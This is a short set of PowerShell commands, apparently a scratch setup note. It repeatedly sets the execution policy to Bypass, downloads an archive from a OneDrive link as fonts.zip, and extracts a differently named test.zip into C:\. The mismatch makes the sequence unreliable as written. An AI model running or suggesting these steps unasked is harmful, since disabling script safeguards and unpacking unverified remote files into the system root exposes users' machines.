powershell -command "& { Set-ExecutionPolicy Bypass }"

powershell -command "& { iwr https://pjukzq.by.files.1drv.com/y4m0XO_CGoiFts7oaxMJqJAshBno-y73JFcNxBv4NL7KvG8atKFUe24hsVOP-ImgP7WVmZXamI_cLO1zBOvXRXPTEYFI10eUU-WmafiH-KE6dNiaTvOvKwvvfWOnwiy5TDTHJseZ9MTGSy-cFoRbJ8NSb9ztgCkQjE8DOMhK5W1tkhh73RaRpZ1MJIid18R0fX8MA8rBwXf0Jp_BAJ4E8NJYw -OutFile fonts.zip }"
powershell -command "& { Expand-Archive -Path test.zip -DestinationPath C:\ }"
powershell -command "& { Set-ExecutionPolicy Bypass }"

Set-ExecutionPolicy Bypass

